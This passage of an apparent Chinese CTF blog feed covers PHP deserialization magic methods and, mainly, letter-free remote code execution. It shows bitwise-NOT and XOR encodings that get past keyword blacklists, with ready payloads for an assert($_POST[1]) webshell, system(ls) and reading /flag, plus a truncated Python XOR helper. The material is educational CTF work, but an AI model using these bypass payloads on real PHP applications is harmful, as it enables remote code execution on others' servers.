class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;variable.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;br /&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;__construct&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;br /&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;__destruct&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;br /&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;__wakeup&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;br /&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__sleep&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;__sleep&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;br /&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;variable&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;variable2&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//创建一个对象，回调用__construct&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$object&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;test&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//序列化一个对象，会调用__sleep&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$serialized&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$object&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//输出序列化后的字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Serialized:&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$serialized&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;br /&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//重建对象，会调用__wakeup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$object2&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$serialized&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//调用printvariable,会输出数据(变量反序列化后都要销毁)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$object2&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;printvariable&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//脚本结束，会调用__destruct&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__construct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Serialized:O:4:&amp;quot;test&amp;quot;:2:&amp;#123;s:8:&amp;quot;variable&amp;quot;;s:33:&amp;quot;变量反序列化后都要销毁&amp;quot;;s:9:&amp;quot;variable2&amp;quot;;s:5:&amp;quot;OTHER&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__wakeup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;变量反序列化后都要销毁&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;想学习更多关于 php 反序列化漏洞的题目的看这里哦&lt;br&gt;
&lt;a href=&#34;&#34;&gt; php 反序列化刷题&lt;/a&gt;&lt;/p&gt;
</content>
        <updated>2023-04-27T08:33:14.709Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/</id>
        <title>无字母数字rce</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/"/>
        <content type="html">&lt;h2 id=&#34;一取反~&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一取反~&#34;&gt;#&lt;/a&gt; 一。取反 (~)&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;system () 函数&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;执行外部程序并显示输出资料&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;eval () 函数&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;把字符串当 php 代码执行，必须以；结尾&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;php 的取反问题～&lt;br&gt;
 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;对于数字取反的规则可以看看这篇:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx&#34;&gt;https://blog.csdn.net/WilliamsWayne/article/details/78259501&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;对于字符取反，由于有大量的不可显字符，要 url 编码&lt;/li&gt;
&lt;li&gt;方法一:&lt;/li&gt;
&lt;li&gt;eg1.&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode(~&amp;quot;phpinfo&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%8F%97%8F%96%91%99%90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:(~%8F%97%8F%96%91%99%90&lt;br&gt;
)();&lt;/p&gt;
&lt;p&gt;配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行&lt;br&gt;
 eg2.&lt;br&gt;
 要构造 &lt;code&gt;assert($_POST[1])&lt;/code&gt;  语句，&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=urlencode(~&amp;quot;assert&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b=urlencode(~&amp;quot;_POST&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;得到&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%9E%8C%8C%9A%8D%8B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%A0%AF%B0%AC%AB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=~(%A0%AF%B0%AC%AB);   //$__=_POST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___=$$__;         //$___=$_POST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_($___[1]);      //assert($_POST[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload(写在一行):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1=phpinfo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;常见取反 url:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;system:%8C%86%8C%8B%9A%92&lt;/li&gt;
&lt;li&gt;ls /:%93%8C%DF%D0&lt;br&gt;
 &lt;code&gt;system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;cat:%9C%9E%8B&lt;/li&gt;
&lt;li&gt;cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98&lt;/li&gt;
&lt;li&gt;cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98&lt;br&gt;
 可自行运行得:&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode(~&amp;quot;xxx&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;方法二:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;卢&amp;quot;.encode(&amp;quot;utf8&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\xe5\x8d\xa2&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=&amp;quot;卢&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(~($_&amp;#123;1&amp;#125;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(~&amp;quot;\x8d&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 输出rr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;$_&amp;#123;1&amp;#125;是\x8d,\x8d取反是r&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;二异或&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二异或&#34;&gt;#&lt;/a&gt; 二。异或&lt;/h1&gt;
&lt;p&gt;引例:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;quot;Z&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果是 o, 为什么？&lt;br&gt;
5 的 ASCII 为 53, 二进制为 00110101,Z 的 ASCII 为 90, 二进制是 01011010, 将它们进行异或 (相同为 0, 不同为一)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;00110101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01011010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01101111=111=o&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;所以，php 中两个字符进行异或操作得到仍然是一个字符，所以我们要是想要 a-z 中个字符时，就可以找到两个非数字字母的字符，只要他们异或的结果是这个字符就行&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMjU0MTA4MC8yMDIxMTAvMjU0MTA4MC0yMDIxMTAxMzIwMTMwOTM1OS0xNDU3NzYwNzkucG5n&#34;&gt; ASCII 码参考&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;比如构造a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01100001 a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;00100001 !&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01000000 @&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此时!^@就是a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用这个方法拼接就完事了&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a:&amp;#x27;%40&amp;#x27;^&amp;#x27;%21&amp;#x27; ; s:&amp;#x27;%7B&amp;#x27;^&amp;#x27;%08&amp;#x27; ; s:&amp;#x27;%7B&amp;#x27;^&amp;#x27;%08&amp;#x27; ; e:&amp;#x27;%7B&amp;#x27;^&amp;#x27;%1E&amp;#x27; ; r:&amp;#x27;%7E&amp;#x27;^&amp;#x27;%0C&amp;#x27; ; t:&amp;#x27;%7C&amp;#x27;^&amp;#x27;%08&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;P:&amp;#x27;%0D&amp;#x27;^&amp;#x27;%5D&amp;#x27; ; O:&amp;#x27;%0F&amp;#x27;^&amp;#x27;%40&amp;#x27; ; S:&amp;#x27;%0E&amp;#x27;^&amp;#x27;%5D&amp;#x27; ; T:&amp;#x27;%0B&amp;#x27;^&amp;#x27;%5F&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以通关脚本来快速得到异或需要的字符&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;valid = &lt;span class=&#34;string&#34;&gt;&amp;quot;1234567890!@$%^*()&amp;#123;&amp;#125;[];\&amp;#x27;\&amp;quot;,.&amp;lt;&amp;gt;/?-=_`~ &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;answer = &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请输入进行异或构造的字符串：&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmp1, tmp2 = &lt;span 